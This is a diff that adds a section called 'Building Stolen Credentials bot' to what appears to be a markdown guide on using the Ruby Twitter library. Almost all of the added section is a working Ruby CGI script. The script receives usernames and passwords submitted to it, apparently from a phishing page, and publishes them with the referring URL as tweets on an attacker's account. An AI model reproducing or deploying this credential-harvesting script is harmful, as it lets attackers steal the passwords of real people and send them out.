@@ -24,3 +24,36 @@ client.followers                    # Fetch followers of current user
 client.status(649235138585366528)   # Fetch a particular Tweet by ID
 ```
 
+## Building Stolen Credentials bot
+
+```ruby
+#!/usr/bin/ruby -w                                                                 
+
+require 'cgi'
+require 'uri'
+require 'twitter'
+
+cgi  = CGI.new
+puts cgi.header  # content type 'text/html'
+
+user = CGI.escape cgi['user']
+pass = CGI.escape cgi['pass']
+time = Time.now.strftime("%D %T")
+
+client = Twitter::REST::Client.new do |config|
+        config.consumer_key        = "YOUR_CONSUMER_KEY"
+        config.consumer_secret     = "YOUR_CONSUMER_SECRET"
+        config.access_token        = "YOUR_ACCESS_TOKEN"
+        config.access_token_secret = "YOUR_ACCESS_SECRET"
+end
+client.user("KINGSABRI")
+
+if cgi.referer.nil? or cgi.referer.empty?
+    # Twitter notification
+    client.update("[Info] No Refere!\n" + "#{CGI.unescape user}:#{CGI.unescape pass}")
+else
+    client.update("[Info] #{cgi.referer}\n #{CGI.unescape user}:#{CGI.unescape pass}")
+end
+
+puts ""
+```
